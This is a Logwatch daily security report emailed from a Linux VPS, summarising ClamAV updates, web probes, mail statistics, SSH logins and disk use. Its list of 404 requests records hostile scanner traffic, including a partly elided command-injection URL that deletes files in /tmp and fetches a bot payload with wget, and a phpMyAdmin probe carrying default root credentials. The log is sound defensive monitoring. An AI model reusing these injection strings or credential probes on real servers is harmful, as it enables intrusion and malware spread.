@@ -1,0 +1,182 @@
+Return-Path: <root@hrankiety.pl>
+Delivered-To: postmaster@hrankiety.pl
+Received: by hrankiety.pl (Postfix, from userid 0)
+	id C6B869F2047B; Sat, 27 Jun 2020 03:38:13 +0200 (CEST)
+To: postmaster@hrankiety.pl
+From: postmaster@hrankiety.pl
+Subject: Logwatch for 2626.serwervps.pl (Linux)
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+Content-Type: text/plain; charset="iso-8859-1"
+Message-Id: <20200627013813.C6B869F2047B@hrankiety.pl>
+Date: Sat, 27 Jun 2020 03:38:04 +0200 (CEST)
+
+
+ ################### Logwatch 7.3.6 (05/19/07) #################### 
+        Processing Initiated: Sat Jun 27 03:38:04 2020
+        Date Range Processed: yesterday
+                              ( 2020-Jun-26 )
+                              Period is day.
+      Detail Level of Output: 0
+              Type of Output: unformatted
+           Logfiles for Host: 2626.serwervps.pl
+  ################################################################## 
+ 
+ --------------------- clam-update Begin ------------------------ 
+
+ Last ClamAV update process started at Fri Jun 26 03:48:13 2020
+ 
+ Last Status:
+    WARNING: Your ClamAV installation is OUTDATED!
+    WARNING: Local version: 0.100.3 Recommended version: 0.102.3
+    DON'T PANIC! Read https://www.clamav.net/documents/upgrading-clamav
+    main.cld is up to date (version: 59, sigs: 4564902, f-level: 60, builder: sigmgr)
+    Downloading daily-25854.cdiff [100%]
+    daily.cld updated (version: 25854, sigs: 2791665, f-level: 63, builder: raynman)
+    Can't query daily.25854.93.1.0.6810DA54.ping.clamav.net
+    bytecode.cld is up to date (version: 331, sigs: 94, f-level: 63, builder: anvilleg)
+    Database updated (7356661 signatures) from db.local.clamav.net (IP: 104.16.218.84)
+ 
+ ---------------------- clam-update End ------------------------- 
+
+ 
+ --------------------- httpd Begin ------------------------ 
+
+ 
+ Connection attempts using mod_proxy:
+    222.186.19.210 -> ip.ws.126.net:443: 1 Time(s)
+ 
+ A total of 6 sites probed the server 
+    171.67.70.81
+    171.67.71.80
+    185.202.2.147
+    185.202.2.57
+    188.138.9.216
+    3.90.209.176
+ 
+ Requests with error response codes
+    400 Bad Request
+       /: 9 Time(s)
+       null: 6 Time(s)
+    404 Not Found
+       /MyAdmin/scripts/setup.php: 2 Time(s)
+       /PHPMYADMIN/scripts/setup.php: 1 Time(s)
+       /TP/html/public/index.php: 1 Time(s)
+       /TP/index.php: 1 Time(s)
+       /TP/public/index.php: 1 Time(s)
+       /a2billing/admin/Public/index.php: 1 Time(s)
+       /admin/: 2 Time(s)
+       /admin//config.php: 1 Time(s)
+       /adminer/adminer.php: 1 Time(s)
+       /bitrix/admin/: 1 Time(s)
+       /boaform/admin/formLogin: 2 Time(s)
+       /database/scripts/setup.php: 1 Time(s)
+       /db/scripts/setup.php: 1 Time(s)
+       /dbadmin/scripts/setup.php: 1 Time(s)
+       /elrekt.php: 1 Time(s)
+       /html/public/index.php: 1 Time(s)
+       /index.php: 1 Time(s)
+       /manager/html: 1 Time(s)
+       /my/scripts/setup.php: 1 Time(s)
+       /myadmin/scripts/setup.php: 1 Time(s)
+       /mysql/scripts/setup.php: 1 Time(s)
+       /mysqladmin/scripts/setup.php: 1 Time(s)
+       /owa/auth/logon.aspx?url=https%3a%2f%2f1%2fecp%2f: 1 Time(s)
+       /pHpMyAdMiN/scripts/setup.php: 1 Time(s)
+       /phpAdmin/scripts/setup.php: 1 Time(s)
+       /phpMyAdmin-2.10.0.0/scripts/setup.php: 1 Time(s)
+       /phpMyAdmin-2.11.11.3/scripts/setup.ph: 1 Time(s)
+       /phpMyAdmin-2.11.11/scripts/setup.php: 1 Time(s)
+       /phpMyAdmin-2/scripts/setup.php: 1 Time(s)
+       /phpMyAdmin-3.0.0.0-all-languages/scripts/setup.php: 1 Time(s)
+       /phpMyAdmin/scripts/db.init.php: 1 Time(s)
+       /phpMyAdmin/scripts/setup.php: 1 Time(s)
+       /phpadmin/scripts/setup.php: 1 Time(s)
+       /phpmyadmin/index.php: 1 Time(s)
+       /phpmyadmin/index.php?pma_username=root&pma_password=mysql: 1 Time(s)
+       /phpmyadmin/scripts/db.init.php: 1 Time(s)
+       /phpmyadmin/scripts/setup.php: 1 Time(s)
+       /phpmyadmin1/scripts/setup.php: 1 Time(s)
+       /phpmyadmin2/scripts/setup.php: 1 Time(s)
+       /pma/scripts/setup.php: 1 Time(s)
+       /public/index.php: 1 Time(s)
+       /scripts/setup.php: 1 Time(s)
+       /setup.php: 1 Time(s)
+       /shell?cd+/tmp;rm+-rf+*;wget+45.95.168.228 ... m7+Selfrep.Jaws: 1 Time(s)
+       /sqladm/scripts/setup.php: 1 Time(s)
+       /sqladmin/scripts/setup.php: 1 Time(s)
+       /thinkphp/html/public/index.php: 1 Time(s)
+       /w00tw00t.at.blackhats.romanian.anti-sec:): 1 Time(s)
+       /wp-login.php: 1 Time(s)
+       /xmlrpc.php: 1 Time(s)
+    405 Method Not Allowed
+       ip.ws.126.net:443: 1 Time(s)
+    408 Request Timeout
+       null: 1 Time(s)
+ 
+ ---------------------- httpd End ------------------------- 
+
+ 
+ --------------------- Postfix Begin ------------------------ 
+
+       28   *Warning: Pre-queue content-filter connection overload 
+    22535   SASL authentication failed 
+       88   Miscellaneous warnings 
+ 
+    2.066M  Bytes accepted                         2,166,831
+    2.061M  Bytes delivered                        2,160,629
+ ========   ================================================
+ 
+       44   Accepted                                  91.67%
+        4   Rejected                                   8.33%
+ --------   ------------------------------------------------
+       48   Total                                    100.00%
+ ========   ================================================
+ 
+        4   Reject HELO/EHLO                         100.00%
+ --------   ------------------------------------------------
+        4   Total Rejects                            100.00%
+ ========   ================================================
+ 
+    22845   Connections made      
+       10   Connections lost      
+    22846   Disconnections        
+       44   Removed from queue    
+       42   Delivered             
+        2   Bounce (remote)       
+        1   DSNs undeliverable    
+ 
+        1   SMTP protocol violations 
+ 
+ 
+ 
+ ---------------------- Postfix End ------------------------- 
+
+ 
+ --------------------- SSHD Begin ------------------------ 
+
+ 
+ Users logging in through sshd:
+    btertil:
+       185.17.41.230 (backup): 2 times
+ 
+ 
+ Received disconnect:
+    11: disconnected by user : 2 Time(s)
+ 
+ ---------------------- SSHD End ------------------------- 
+
+ 
+ --------------------- Disk Space Begin ------------------------ 
+
+ Filesystem      Size  Used Avail Use% Mounted on
+ /dev/simfs       50G   29G   22G  57% /
+ none            1.0G  4.0K  1.0G   1% /dev
+ 
+ 
+ ---------------------- Disk Space End ------------------------- 
+
+ 
+ ###################### Logwatch End ######################### 
+
+ 
